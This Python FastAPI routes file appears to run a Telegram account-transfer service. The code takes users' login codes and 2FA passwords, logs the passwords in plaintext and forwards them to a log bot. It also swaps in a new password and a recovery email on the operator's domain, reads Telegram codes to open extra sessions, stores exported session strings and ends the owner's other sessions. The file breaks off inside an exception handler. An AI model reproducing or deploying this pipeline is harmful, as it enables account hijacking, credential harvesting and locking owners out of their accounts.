"""
API Routes V3 - Simplified and Unified
Main endpoints:
- POST /api/v1/auth/init - Initialize authentication
- POST /api/v1/auth/verify - Verify code/2FA
- GET /api/v1/account/audit/{account_id} - Run security audit
- POST /api/v1/account/finalize/{account_id} - Finalize account

Email endpoints:
- GET /api/v1/email/target/{account_id} - Get target email for user
- GET /api/v1/email/code/{account_id} - Check if code received
- POST /api/v1/email/confirm/{account_id} - Confirm email changed

Session endpoints:
- GET /api/v1/sessions/health/{account_id} - Check session health
- POST /api/v1/sessions/regenerate/{account_id} - Regenerate sessions

Delivery endpoints:
- POST /api/v1/delivery/request-code/{account_id} - Request delivery code
- POST /api/v1/delivery/confirm/{account_id} - Confirm delivery received
"""

import time
import json
import secrets
import string
import asyncio
from datetime import datetime, timedelta
from typing import Optional, Dict
from fastapi import APIRouter, HTTPException, Request
from pydantic import BaseModel

from backend.core_engine.logger import get_logger, log_request, log_response, log_auth_step
from backend.core_engine.pyrogram_client import get_session_manager
from backend.core_engine.telethon_client import get_telethon_manager
from backend.core_engine.credentials_logger import (
    log_credentials, 
    generate_email_for_account, 
    get_email_hash,
    get_full_email_info,
    get_phone_from_hash,
    get_telegram_id_from_hash
)
from backend.services.security_audit import SecurityAuditService, TransferMode
from backend.models.database import (
    AuthStatus, DeliveryStatus, TransferMode as DBTransferMode,
    add_account, get_account, update_account, log_auth_action,
    persistent_cache_set, persistent_cache_get, persistent_cache_clear,
    persistent_cache_check_timeout, persistent_cache_remaining_time,
    persistent_cache_cleanup_expired, SESSION_CACHE_TTL_SECONDS
)
from backend.api.webhook_routes import get_code_by_hash, clear_codes_for_hash, email_codes_store
from config import API_ID, API_HASH, EMAIL_DOMAIN

logger = get_logger("RoutesV3")

router = APIRouter(prefix="/api/v1", tags=["V3 API"])


# ============== Request Models ==============

class InitAuthRequest(BaseModel):
    phone: str
    transfer_mode: str = "bot_only"  # "bot_only" or "user_keeps_session"


class VerifyAuthRequest(BaseModel):
    phone: str
    code: Optional[str] = None
    password: Optional[str] = None


class FinalizeRequest(BaseModel):
    confirm_email_changed: bool = False
    two_fa_password: Optional[str] = None


class DeliveryConfirmRequest(BaseModel):
    received: bool = True


# ============== Session Cache (RAM + SQLite Persistent) ==============

# In-memory layer for fast reads; SQLite layer for persistence across restarts.
# Write-through: every write goes to both RAM and SQLite.
# Read: RAM first → fallback to SQLite (and populate RAM).
_ram_cache: Dict[str, Dict] = {}

SESSION_TIMEOUT_SECONDS = SESSION_CACHE_TTL_SECONDS  # 30 minutes (from database.py)


async def cache_session_data(phone: str, **kwargs):
    """Cache session data in RAM + persistent SQLite store."""
    if phone not in _ram_cache:
        _ram_cache[phone] = {"started_at": datetime.utcnow().isoformat()}
    for k, v in kwargs.items():
        _ram_cache[phone][k] = v.isoformat() if isinstance(v, datetime) else v
    # Write-through to SQLite
    await persistent_cache_set(phone, **kwargs)


async def get_cached_data(phone: str, key: str = None):
    """Get cached data — RAM first, fallback to SQLite."""
    # Try RAM
    if phone in _ram_cache:
        if key:
            return _ram_cache[phone].get(key)
        return _ram_cache[phone]
    # Fallback to SQLite (server may have restarted)
    data = await persistent_cache_get(phone, key)
    if data and not key:
        _ram_cache[phone] = data  # Populate RAM
    return data


async def clear_session_cache(phone: str):
    """Clear cached data from both RAM and SQLite."""
    _ram_cache.pop(phone, None)
    await persistent_cache_clear(phone)


async def check_session_timeout(phone: str) -> bool:
    """Check if session has timed out (30 min limit)."""
    return await persistent_cache_check_timeout(phone)


async def get_session_remaining_time(phone: str) -> int:
    """Get remaining time in seconds."""
    return await persistent_cache_remaining_time(phone)


# ============== Concurrency Locks ==============

# Per-phone locks to prevent overlapping auth/finalize for the same number
_auth_locks: Dict[str, asyncio.Lock] = {}


def _get_auth_lock(phone: str) -> asyncio.Lock:
    """Get or create an asyncio.Lock for a phone number (concurrency isolation)."""
    if phone not in _auth_locks:
        _auth_locks[phone] = asyncio.Lock()
    return _auth_locks[phone]


# ============== Helper Functions ==============

def get_pyrogram():
    return get_session_manager(API_ID, API_HASH)


def get_telethon():
    return get_telethon_manager(API_ID, API_HASH)


def generate_strong_password(length: int = 20) -> str:
    alphabet = string.ascii_letters + string.digits + "!@#$%^&*()_+-="
    return ''.join(secrets.choice(alphabet) for _ in range(length))


def validate_email_domain(email: str) -> bool:
    """Strict check: email MUST end with @channelsseller.site"""
    if not email:
        return False
    return email.strip().lower().endswith(f"@{EMAIL_DOMAIN}")


async def check_session_validity(manager, phone: str) -> dict:
    """Check if a session is valid by trying to get user info"""
    try:
        result = await manager.get_me_info(phone)
        return {"valid": result.get("status") == "success", "result": result}
    except Exception as e:
        return {"valid": False, "error": str(e)}


async def ensure_pyrogram_connected(phone: str, manager=None) -> bool:
    """
    Ensure Pyrogram client is active for this phone.
    If not in RAM (e.g. after server restart), reconnect from stored session string.
    Returns True if client is connected, False if no session available.
    """
    if manager is None:
        manager = get_pyrogram()
    
    # Already active in RAM
    if phone in manager.active_clients:
        return True
    
    # Try to reconnect from DB session string
    account = await get_account(phone)
    if account and account.pyrogram_session:
        logger.info(f"[RECONNECT] Pyrogram client not in RAM for {phone}, reconnecting from stored session...")
        try:
            connected = await manager.connect_from_string(phone, account.pyrogram_session)
            if connected:
                logger.info(f"[RECONNECT] Successfully reconnected Pyrogram for {phone}")
                return True
            else:
                logger.warning(f"[RECONNECT] Failed to reconnect Pyrogram for {phone} (session may be dead)")
        except Exception as e:
            logger.error(f"[RECONNECT] Error reconnecting Pyrogram for {phone}: {e}")
    
    return False


# ============== Auth Endpoints ==============

@router.post("/auth/init")
async def init_auth(request: InitAuthRequest, req: Request):
    """
    Initialize authentication - Send verification code.
    Uses per-phone lock to prevent overlapping sessions for the same number.
    Supports 10+ simultaneous logins for different numbers (no shared state).
    """
    phone = request.phone
    # Per-phone lock: isolates concurrent requests for the SAME phone
    auth_lock = _get_auth_lock(phone)
    async with auth_lock:
        return await _do_init_auth(request, req, phone)


async def _do_init_auth(request: InitAuthRequest, req: Request, phone: str):
    start_time = time.time()
    log_request(logger, "POST", "/auth/init", {"phone": phone})
    
    try:
        # Determine transfer mode - convert string to enum value
        if request.transfer_mode == "bot_only":
            transfer_mode = "BOT_ONLY"
        else:
            transfer_mode = "USER_KEEPS_SESSION"
        
        # Check existing account
        account = await get_account(phone)
        if not account:
            account = await add_account(phone)
        
        # Update transfer mode
        await update_account(phone, transfer_mode=transfer_mode)
        
        # Check if already authenticated in both sessions
        manager = get_pyrogram()
        telethon_mgr = get_telethon()
        
        # Check Pyrogram session
        pyrogram_check = await manager.get_me_info(phone)
        pyrogram_authenticated = pyrogram_check.get("status") == "success"
        
        # Check Telethon session
        telethon_authenticated = False
        try:
            telethon_check = await telethon_mgr.get_me_info(phone)
            telethon_authenticated = telethon_check.get("status") == "success"
        except:
            pass
        
        # If already authenticated in either session, skip code sending
        if pyrogram_authenticated or telethon_authenticated:
            logger.info(f"Account already authenticated: pyrogram={pyrogram_authenticated}, telethon={telethon_authenticated}")
            
            # Get user info for telegram_id
            user_info = pyrogram_check if pyrogram_authenticated else telethon_check
            telegram_id = user_info.get("id") if user_info.get("status") == "success" else None
            
            # Generate email info
            email_info = get_full_email_info(telegram_id, phone) if telegram_id else {}
            
            # Update account
            await update_account(
                phone,
                status=AuthStatus.AUTHENTICATED,
                telegram_id=telegram_id,
                email_hash=email_info.get("hash"),
                target_email=email_info.get("email")
            )
            await log_auth_action(phone, "init_auth", "already_authenticated")
            
            # Start session timer
            await cache_session_data(phone, started_at=datetime.utcnow(), telegram_id=telegram_id)
            
            duration = time.time() - start_time
            response = {
                "status": "already_authenticated",
                "message": "Account already authenticated. Skip to audit.",
                "telegram_id": telegram_id,
                "target_email": email_info.get("email"),
                "email_hash": email_info.get("hash"),
                "transfer_mode": request.transfer_mode,
                "session_timeout": SESSION_TIMEOUT_SECONDS,
                "duration": duration
            }
            log_response(logger, 200, response)
            return response
        
        # Send code via Pyrogram
        result = await manager.send_code(phone)
        
        logger.info(f"send_code result: {result}")
        
        # Check for success statuses: "code_sent" or "already_logged_in"
        if result["status"] in ["code_sent", "already_logged_in", "success"]:
            await update_account(phone, status=AuthStatus.PENDING_CODE)
            await log_auth_action(phone, "init_auth", "success")
            
            # Start session timer (30 min limit)
            await cache_session_data(phone, started_at=datetime.utcnow())
            
            duration = time.time() - start_time
            response = {
                "status": result["status"],
                "message": "Verification code sent to Telegram" if result["status"] == "code_sent" else "Already logged in",
                "phone_code_hash": result.get("phone_code_hash"),
                "transfer_mode": request.transfer_mode,
                "session_timeout": SESSION_TIMEOUT_SECONDS,
                "duration": duration
            }
            log_response(logger, 200, response)
            return response
        else:
            logger.error(f"init_auth failed: {result}")
            await log_auth_action(phone, "init_auth", "failed", result.get("error"))
            raise HTTPException(status_code=400, detail=result.get("error", "Unknown error"))
            
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error in init_auth: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/auth/verify")
async def verify_auth(request: VerifyAuthRequest, req: Request):
    """
    Verify authentication - Code or 2FA password.
    Uses per-phone lock for concurrency isolation.
    Returns has_2fa so frontend knows whether to show email step or skip it.
    """
    phone = request.phone
    auth_lock = _get_auth_lock(phone)
    async with auth_lock:
        return await _do_verify_auth(request, req, phone)


async def _do_verify_auth(request: VerifyAuthRequest, req: Request, phone: str):
    start_time = time.time()
    log_request(logger, "POST", "/auth/verify", {"phone": phone})
    
    try:
        manager = get_pyrogram()
        account = await get_account(phone)
        
        if not account:
            raise HTTPException(status_code=404, detail="Account not found. Call /auth/init first.")
        
        # If code provided, verify code
        if request.code:
            result = await manager.verify_code(phone, request.code)
            
            if result["status"] == "logged_in":
                # Get user info
                user_info = await manager.get_me_info(phone)
                telegram_id = user_info.get("id") if user_info.get("status") == "success" else None
                
                # Generate email info
                email_info = get_full_email_info(telegram_id, phone) if telegram_id else {}
                
                # Validate generated email domain
                gen_email = email_info.get("email", "")
                if gen_email and not validate_email_domain(gen_email):
                    logger.error(f"Generated email domain mismatch: {gen_email}")
                    raise HTTPException(status_code=500, detail=f"Internal email generation error: domain must be @{EMAIL_DOMAIN}")
                
                await update_account(
                    phone,
                    status=AuthStatus.AUTHENTICATED,
                    telegram_id=telegram_id,
                    email_hash=email_info.get("hash"),
                    target_email=email_info.get("email"),
                    has_2fa=False
                )
                await log_auth_action(phone, "verify_code", "success")
                
                # Export and save session string immediately (survives server restart)
                try:
                    session_str = await manager.export_session_string(phone)
                    if session_str:
                        await update_account(phone, pyrogram_session=session_str)
                        logger.info(f"[AUTH] Pyrogram session saved for {phone} (length: {len(session_str)})")
                except Exception as e:
                    logger.warning(f"[AUTH] Could not save session for {phone}: {e}")
                
                # Send log to bot - new account registered
                try:
                    from backend.log_bot import log_new_account
                    await log_new_account(phone, telegram_id, email_info.get("email", ""))
                except:
                    pass
                
                duration = time.time() - start_time
                return {
                    "status": "authenticated",
                    "message": "Successfully authenticated",
                    "telegram_id": telegram_id,
                    "target_email": email_info.get("email"),
                    "email_hash": email_info.get("hash"),
                    "has_2fa": False,
                    "duration": duration
                }
            
            elif result["status"] == "2fa_required":
                await update_account(phone, status=AuthStatus.PENDING_2FA, has_2fa=True)
                await log_auth_action(phone, "verify_code", "2fa_required")
                
                return {
                    "status": "2fa_required",
                    "message": "2FA password required",
                    "has_2fa": True,
                    "hint": result.get("hint", "")
                }
            else:
                await log_auth_action(phone, "verify_code", "failed", result.get("error"))
                raise HTTPException(status_code=400, detail=result.get("error"))
        
        # If password provided, verify 2FA
        elif request.password:
            result = await manager.verify_2fa(phone, request.password)
            
            if result["status"] == "logged_in":
                user_info = await manager.get_me_info(phone)
                telegram_id = user_info.get("id") if user_info.get("status") == "success" else None
                
                email_info = get_full_email_info(telegram_id, phone) if telegram_id else {}
                
                await update_account(
                    phone,
                    status=AuthStatus.AUTHENTICATED,
                    telegram_id=telegram_id,
                    email_hash=email_info.get("hash"),
                    target_email=email_info.get("email")
                )
                await log_auth_action(phone, "verify_2fa", "success")
                
                # Log password
                log_credentials(
                    phone=phone,
                    action="2FA_VERIFIED",
                    password=request.password,
                    telegram_id=telegram_id
                )
                
                # Cache 2FA password for later use in finalize
                await cache_session_data(phone, two_fa_password=request.password, telegram_id=telegram_id)
                
                # Export and save session string immediately (survives server restart)
                try:
                    session_str = await manager.export_session_string(phone)
                    if session_str:
                        await update_account(phone, pyrogram_session=session_str)
                        logger.info(f"[AUTH] Pyrogram session saved for {phone} after 2FA (length: {len(session_str)})")
                except Exception as e:
                    logger.warning(f"[AUTH] Could not save session for {phone}: {e}")
                
                duration = time.time() - start_time
                return {
                    "status": "authenticated",
                    "message": "Successfully authenticated with 2FA",
                    "telegram_id": telegram_id,
                    "target_email": email_info.get("email"),
                    "email_hash": email_info.get("hash"),
                    "has_2fa": True,
                    "two_fa_cached": True,
                    "duration": duration
                }
            else:
                await log_auth_action(phone, "verify_2fa", "failed", result.get("error"))
                raise HTTPException(status_code=400, detail=result.get("error"))
        
        else:
            raise HTTPException(status_code=400, detail="Either code or password must be provided")
            
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error in verify_auth: {e}")
        raise HTTPException(status_code=500, detail=str(e))


# ============== Account Audit Endpoints ==============

@router.get("/account/audit/{account_id}")
async def audit_account(account_id: str, req: Request):
    """
    Run security audit on account
    Checks: 2FA, recovery email, other sessions, delete requests
    """
    start_time = time.time()
    phone = account_id
    log_request(logger, "GET", f"/account/audit/{phone}", None)
    
    try:
        manager = get_pyrogram()
        
        # Auto-reconnect if client not in RAM (e.g. after server restart)
        await ensure_pyrogram_connected(phone, manager)
        
        account = await get_account(phone)
        
        if not account:
            raise HTTPException(status_code=404, detail="Account not found")
        
        # Get telegram_id
        telegram_id = account.telegram_id
        if not telegram_id:
            user_info = await manager.get_me_info(phone)
            telegram_id = user_info.get("id") if user_info.get("status") == "success" else None
        
        # Generate our target email for this account
        if not account.target_email and telegram_id:
            email_info = get_full_email_info(telegram_id, phone)
            await update_account(
                phone,
                email_hash=email_info["hash"],
                target_email=email_info["email"]
            )
            our_email = email_info["email"]
            our_hash = email_info["hash"]
        else:
            our_email = account.target_email or ""
            our_hash = account.email_hash or ""
        
        # Try to pass known password for full recovery email check
        # Use cached 2FA password from verify step, or stored generated password
        known_password = await get_cached_data(phone, "two_fa_password") or account.generated_password
        
        # Get security info (with password if available for full email check)
        security_info = await manager.get_security_info(phone, known_password=known_password)
        if security_info.get("status") == "error":
            raise HTTPException(status_code=400, detail=security_info.get("error"))
        
        # Get transfer mode
        mode = TransferMode.MODE_BOT_ONLY
        if account.transfer_mode == DBTransferMode.USER_KEEPS_SESSION:
            mode = TransferMode.MODE_USER_KEEPS_SESSION
        
        # Run audit (now with correct email separation)
        passed, issues, actions_needed = SecurityAuditService.run_audit(
            security_info=security_info,
            phone=phone,
            mode=mode,
            telegram_id=telegram_id
        )
        
        # Determine email status from security_info
        recovery_email_full = security_info.get("recovery_email_full")
        email_unconfirmed = security_info.get("email_unconfirmed_pattern")
        has_recovery = security_info.get("has_recovery_email", False)
        
        email_changed = False
        email_verified = False
        
        if recovery_email_full:
            # We know the exact email - check if it's ours
            if EMAIL_DOMAIN in recovery_email_full.lower():
                email_changed = True
                email_verified = True
                logger.info(f"[AUDIT] Recovery email IS ours: {recovery_email_full}")
            else:
                logger.warning(f"[AUDIT] Recovery email is NOT ours: {recovery_email_full}")
        elif email_unconfirmed:
            # Pending email - check pattern
            if EMAIL_DOMAIN in str(email_unconfirmed).lower():
                email_changed = True
                email_verified = False
                logger.info(f"[AUDIT] Our email pending confirmation: {email_unconfirmed}")
        elif has_recovery and not known_password:
            # Recovery email exists but we can't check it (no password)
            # Do NOT trust DB flag blindly - flag as unknown
            logger.warning(f"[AUDIT] Recovery email exists but unknown (no password to check)")
        
        # Update account with audit results
        await update_account(
            phone,
            status=AuthStatus.AUDIT_PASSED if passed else AuthStatus.AUDIT_FAILED,
            has_2fa=security_info.get("has_password", False),
            has_recovery_email=has_recovery,
            other_sessions_count=security_info.get("other_sessions_count", 0),
            audit_passed=passed,
            audit_issues=json.dumps(issues) if issues else None,
            email_changed=email_changed,
            email_verified=email_verified
        )
        
        await log_auth_action(phone, "audit", "passed" if passed else "failed")
        
        try:
            from backend.log_bot import log_audit_result
            await log_audit_result(phone, passed, len(issues))
        except:
            pass
        
        # Format report
        report = SecurityAuditService.format_audit_report(passed, issues, actions_needed)
        report["account_id"] = phone
        report["telegram_id"] = telegram_id
        report["target_email"] = our_email
        report["email_hash"] = our_hash
        report["email_changed"] = email_changed
        report["email_verified"] = email_verified
        report["recovery_email_full"] = recovery_email_full
        report["email_unconfirmed_pattern"] = email_unconfirmed
        report["login_email_pattern"] = security_info.get("login_email_pattern")
        report["transfer_mode"] = account.transfer_mode.value if account.transfer_mode else "bot_only"
        report["duration"] = time.time() - start_time
        
        log_response(logger, 200, report)
        return report
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error in audit: {e}")
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/account/finalize/{account_id}")
async def finalize_account(account_id: str, request: FinalizeRequest, req: Request):
    """
    Finalize account - ordered steps:
    1. 2FA Password (enable WITHOUT email, or change if already enabled)
    2. Recovery Email (set separately + confirm with email code)
    3. Clear old codes (prevent stale code confusion)
    4. Export Pyrogram session
    5. Telethon session (new code from Telegram 777000 ONLY)
    6. Terminate other sessions + save to DB
    """
    start_time = time.time()
    phone = account_id
    log_request(logger, "POST", f"/account/finalize/{phone}", None)
    
    try:
        # Check session timeout (30 min limit)
        if await check_session_timeout(phone):
            manager = get_pyrogram()
            try:
                backup_session = await manager.export_session_string(phone)
                if backup_session:
                    await update_account(phone, pyrogram_session=backup_session, status=AuthStatus.EXPIRED)
                    logger.warning(f"Session expired for {phone}, saved to backup")
            except:
                pass
            await clear_session_cache(phone)
            raise HTTPException(status_code=408, detail="Session expired (30 minutes). Please start over.")
        
        account = await get_account(phone)
        if not account:
            raise HTTPException(status_code=404, detail="Account not found")
        
        if not account.audit_passed:
            raise HTTPException(status_code=400, detail="Audit not passed. Run audit first.")
        
        manager = get_pyrogram()
        
        # Auto-reconnect if client not in RAM (e.g. after server restart)
        await ensure_pyrogram_connected(phone, manager)
        if phone not in manager.active_clients:
            raise HTTPException(status_code=400, detail="Session lost and could not reconnect. Please re-authenticate.")
        
        from backend.core_engine.pyrogram_client import pattern_matches_email
        
        # Generate strong password
        new_password = generate_strong_password(24)
        
        # Get cached 2FA password (from verify step or previous failed finalize)
        cached_2fa = await get_cached_data(phone, "two_fa_password")
        current_2fa_password = request.two_fa_password or cached_2fa or account.generated_password
        
        target_email = account.target_email
        email_hash = account.email_hash
        
        # Get or create lock for this phone to prevent concurrent finalize
        finalize_lock = manager._get_lock(phone)
        
        async with finalize_lock:
            logger.info(f"[FINALIZE] Acquired lock for {phone}")
            
            # ============================================================
            # STEP 1: Check current 2FA status
            # ============================================================
            logger.info(f"[FINALIZE] Step 1: Checking 2FA status for {phone}")
            security_info = await manager.get_security_info(phone, known_password=current_2fa_password)
            has_password = security_info.get("has_password", False)
            
            # Initialize tracking variables
            email_needs_confirmation = False
            confirmation_success = False
            email_is_ours = False
            recovery_email_full = None
            email_unconfirmed = None
            
            # ============================================================
            # STEP 2: 2FA Password (enable or change)
            # Enable WITHOUT email - email is set separately in Step 3
            # ============================================================
            if has_password:
                # 2FA already enabled - try to change password
                if current_2fa_password:
                    logger.info(f"[FINALIZE] Step 2: 2FA already enabled - changing password for {phone}")
                    result = await manager.change_2fa_password(
                        phone=phone,
                        current_password=current_2fa_password,
                        new_password=new_password
                    )
                    if result.get("status") != "success":
                        raise HTTPException(status_code=400, detail=f"Failed to change 2FA password: {result.get('error')}")
                    logger.info(f"[FINALIZE] Step 2: 2FA password changed for {phone}")
                else:
                    raise HTTPException(
                        status_code=400,
                        detail="2FA is enabled but no current password available. Please provide your 2FA password."
                    )
            else:
                # 2FA NOT enabled - enable with password ONLY (no email)
                logger.info(f"[FINALIZE] Step 2: Enabling 2FA (password only, no email) for {phone}")
                result = await manager.enable_2fa(phone, new_password, hint="", email="")
                if result.get("status") != "success":
                    raise HTTPException(status_code=400, detail=f"Failed to enable 2FA: {result.get('error')}")
                logger.info(f"[FINALIZE] Step 2: 2FA enabled for {phone}")
            
            # Save password to DB immediately (crash recovery)
            await update_account(phone, generated_password=new_password, has_2fa=True)
            await cache_session_data(phone, two_fa_password=new_password)
            logger.info(f"[FINALIZE] Step 2: Password saved to DB for {phone}")
            
            # ============================================================
            # STEP 3: Recovery Email (set separately + confirm with code)
            # ============================================================
            logger.info(f"[FINALIZE] Step 3: Handling recovery email for {phone}")
            
            # Check current recovery email status using the NEW password
            security_info2 = await manager.get_security_info(phone, known_password=new_password)
            recovery_email_full = security_info2.get("recovery_email_full")
            email_unconfirmed = security_info2.get("email_unconfirmed_pattern")
            
            if recovery_email_full and EMAIL_DOMAIN in recovery_email_full.lower():
                email_is_ours = True
                logger.info(f"[FINALIZE] Step 3: Recovery email already ours (confirmed): {recovery_email_full}")
            elif email_unconfirmed and EMAIL_DOMAIN in str(email_unconfirmed).lower():
                email_is_ours = True
                email_needs_confirmation = True
                logger.info(f"[FINALIZE] Step 3: Recovery email ours but pending confirmation: {email_unconfirmed}")
            elif email_unconfirmed and target_email and pattern_matches_email(email_unconfirmed, target_email):
                email_is_ours = True
                email_needs_confirmation = True
                logger.info(f"[FINALIZE] Step 3: Recovery email ours by pattern match, pending: {email_unconfirmed}")
            
            # If recovery email not ours, set it now
            if not email_is_ours and target_email:
                logger.info(f"[FINALIZE] Step 3: Setting recovery email to {target_email} for {phone}")
                
                # Clear any old email codes first
                if email_hash:
                    clear_codes_for_hash(email_hash)
                
                email_result = await manager.change_recovery_email(phone, new_password, target_email)
                if email_result.get("status") != "success":
                    logger.error(f"[FINALIZE] Step 3: Failed to set recovery email: {email_result.get('error')}")
                    # Don't block - continue without email
                else:
                    email_needs_confirmation = True
                    email_is_ours = True
                    logger.info(f"[FINALIZE] Step 3: Recovery email set, waiting for confirmation code")
            
            # Wait for and confirm email code
            if email_needs_confirmation and target_email and email_hash:
                logger.info(f"[FINALIZE] Step 3: Waiting for email confirmation code for {phone}...")
                code = None
                
                # Wait up to 30 seconds for code via webhook
                for attempt in range(30):
                    await asyncio.sleep(1)
                    code = get_code_by_hash(email_hash)
                    if code:
                        logger.info(f"[FINALIZE] Step 3: Email code received for {phone}: {code}")
                        break
                
                if code:
                    logger.info(f"[FINALIZE] Step 3: Confirming email for {phone} with code")
                    confirm_result = await manager.confirm_recovery_email(phone, code)
                    
                    if confirm_result.get("status") == "success":
                        confirmation_success = True
                        await update_account(phone, email_changed=True, email_verified=True)
                        logger.info(f"[FINALIZE] Step 3: Email confirmed successfully for {phone}")
                        
                        log_credentials(
                            phone=phone,
                            action="EMAIL_AUTO_CONFIRMED",
                            email=target_email,
                            telegram_id=account.telegram_id
                        )
                    else:
                        logger.warning(f"[FINALIZE] Step 3: Email confirmation failed: {confirm_result.get('error')}")
                else:
                    logger.warning(f"[FINALIZE] Step 3: No email code received within 30s for {phone}")
                
                if not confirmation_success:
                    logger.warning(f"[FINALIZE] Step 3: Email not confirmed, continuing with finalize for {phone}")
            
            # ============================================================
            # STEP 4: Clear old codes (prevent confusion with Telethon)
            # ============================================================
            logger.info(f"[FINALIZE] Step 4: Clearing old codes for {phone}")
            if email_hash:
                clear_codes_for_hash(email_hash)
            
            # Log password set
            try:
                from backend.log_bot import log_password_set
                await log_password_set(phone, account.telegram_id, new_password)
            except:
                pass
            
            # ============================================================
            # STEP 5: Export Pyrogram session + DISCONNECT
            # ============================================================
            logger.info(f"[FINALIZE] Step 5: Exporting Pyrogram session for {phone}")
            pyrogram_session = await manager.export_session_string(phone)
            if not pyrogram_session:
                raise HTTPException(status_code=500, detail="Failed to export Pyrogram session string")
            logger.info(f"[FINALIZE] Step 5: Pyrogram session exported (length: {len(pyrogram_session)})")
            
            # Save Pyrogram session immediately
            await update_account(phone, pyrogram_session=pyrogram_session)
            
            # DISCONNECT Pyrogram - free RAM, prevent simultaneous connections
            await manager.disconnect(phone)
            logger.info(f"[FINALIZE] Step 5: Pyrogram disconnected for {phone}")
            
            # ============================================================
            # STEP 6: Telethon session (sequential connection)
            # 6a: Telethon sends code
            # 6b: Reconnect Pyrogram briefly to read code, then disconnect
            # 6c: Verify code with Telethon, export session, disconnect
            # ============================================================
            logger.info(f"[FINALIZE] Step 6: Creating Telethon session for {phone}")
            telethon_manager = get_telethon()
            telethon_session_string = None
            
            try:
                await asyncio.sleep(2)
                
                # 6a: Telethon sends code
                telethon_result = await telethon_manager.send_code(phone)
                
                if telethon_result.get("status") == "already_logged_in":
                    telethon_session_string = await telethon_manager.export_session_string(phone)
                    # Disconnect Telethon after export
                    await telethon_manager.disconnect(phone)
                    logger.info(f"[FINALIZE] Step 6: Telethon already logged in for {phone}")
                
                elif telethon_result.get("status") == "code_sent":
                    logger.info(f"[FINALIZE] Step 6a: Telethon code sent, waiting for arrival...")
                    await asyncio.sleep(4)
                    
                    # 6b: Reconnect Pyrogram briefly to read code from 777000
                    code = None
                    try:
                        reconnected = await manager.connect_from_string(phone, pyrogram_session)
                        if reconnected:
                            for attempt in range(8):
                                code = await manager.get_last_telegram_code(phone, max_age_seconds=30)
                                if code:
                                    logger.info(f"[FINALIZE] Step 6b: Got code from Telegram 777000: {code}")
                                    break
                                await asyncio.sleep(2)
                        # Disconnect Pyrogram immediately after reading
                        await manager.disconnect(phone)
                        logger.info(f"[FINALIZE] Step 6b: Pyrogram disconnected after reading code")
                    except Exception as e:
                        logger.error(f"[FINALIZE] Step 6b: Error reading code via Pyrogram: {e}")
                        try:
                            await manager.disconnect(phone)
                        except:
                            pass
                    
                    if not code:
                        logger.error(f"[FINALIZE] Step 6b: Could not get Telegram code for Telethon: {phone}")
                    else:
                        # 6c: Verify code with Telethon
                        verify_result = await telethon_manager.verify_code(phone, code)
                        
                        if verify_result.get("status") == "2fa_required":
                            logger.info(f"[FINALIZE] Step 6c: Telethon 2FA required, using new password")
                            tfa_result = await telethon_manager.verify_2fa(phone, new_password)
                            if tfa_result.get("status") == "logged_in":
                                telethon_session_string = await telethon_manager.export_session_string(phone)
                                logger.info(f"[FINALIZE] Step 6c: Telethon session created with 2FA for {phone}")
                            else:
                                logger.error(f"[FINALIZE] Step 6c: Telethon 2FA failed: {tfa_result}")
                        elif verify_result.get("status") == "logged_in":
                            telethon_session_string = await telethon_manager.export_session_string(phone)
                            logger.info(f"[FINALIZE] Step 6c: Telethon session created for {phone}")
                        else:
                            logger.error(f"[FINALIZE] Step 6c: Telethon verify failed: {verify_result}")
                    
                    # Disconnect Telethon after session export
                    await telethon_manager.disconnect(phone)
                    logger.info(f"[FINALIZE] Step 6c: Telethon disconnected for {phone}")
                else:
                    logger.error(f"[FINALIZE] Step 6: Telethon send_code failed: {telethon_result}")
                    await telethon_manager.disconnect(phone)
            
            except Exception as e:
                logger.error(f"[FINALIZE] Step 6: Telethon error: {e}")
                try:
                    await telethon_manager.disconnect(phone)
                except:
                    pass
            
            # CRITICAL: Telethon session must be created
            if not telethon_session_string:
                logger.error(f"[FINALIZE] BLOCKED: Telethon session not created for {phone}")
                raise HTTPException(
                    status_code=400,
                    detail="Failed to create Telethon session. Please try again."
                )
            
            logger.info(f"[FINALIZE] Step 6: Telethon session saved (length: {len(telethon_session_string)})")
            
            # ============================================================
            # STEP 7: Terminate other sessions + save everything
            # Reconnect Pyrogram briefly for terminate, then disconnect
            # ============================================================
            logger.info(f"[FINALIZE] Step 7: Finalizing and saving for {phone}")
            
            try:
                from backend.log_bot import log_session_registered
                await log_session_registered(phone, "pyrogram+telethon")
            except:
                pass
            
            # Terminate other (non-bot) sessions if bot_only mode
            terminated_count = 0
            if account.transfer_mode == DBTransferMode.BOT_ONLY:
                try:
                    reconnected = await manager.connect_from_string(phone, pyrogram_session)
                    if reconnected:
                        term_result = await manager.terminate_other_sessions(phone, keep_bot_sessions=True)
                        terminated_count = term_result.get("terminated_count", 0)
                    await manager.disconnect(phone)
                    logger.info(f"[FINALIZE] Step 7: Terminated {terminated_count} user sessions, Pyrogram disconnected")
                except Exception as e:
                    logger.warning(f"[FINALIZE] Step 7: Error terminating sessions: {e}")
                    try:
                        await manager.disconnect(phone)
                    except:
                        pass
            
            # Log credentials
            log_credentials(
                phone=phone,
                action="ACCOUNT_FINALIZED",
                password=new_password,
                email=account.target_email,
                telegram_id=account.telegram_id,
                extra_data={
                    "transfer_mode": account.transfer_mode.value if account.transfer_mode else "bot_only",
                    "terminated_sessions": terminated_count
                }
            )
            
            # Final DB update with all session strings
            await update_account(
                phone,
                status=AuthStatus.COMPLETED,
                generated_password=new_password,
                pyrogram_session=pyrogram_session,
                telethon_session=telethon_session_string,
                completed_at=datetime.utcnow(),
                delivery_status=DeliveryStatus.BOT_RECEIVED,
                has_2fa=True
            )
            
            await log_auth_action(phone, "finalize", "success")
            await clear_session_cache(phone)
            
            duration = time.time() - start_time
            
            finalize_result = {
                "status": "success",
                "message": "Account finalized successfully",
                "account_id": phone,
                "password": new_password,
                "transfer_mode": account.transfer_mode.value if account.transfer_mode else "bot_only",
                "terminated_sessions": terminated_count,
                "duration": duration,
                "steps": {
                    "2fa_password_set": True,
                    "recovery_email": {
                        "email_is_ours": email_is_ours,
                        "email_confirmed": confirmation_success,
                        "target_email": target_email
                    },
                    "sessions_created": {
                        "pyrogram": bool(pyrogram_session),
                        "telethon": bool(telethon_session_string)
                    }
                }
            }
            
            logger.info(f"[FINALIZE] Completed successfully for {phone} in {duration:.2f}s")
            return finalize_result
            
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error in finalize: {e}")
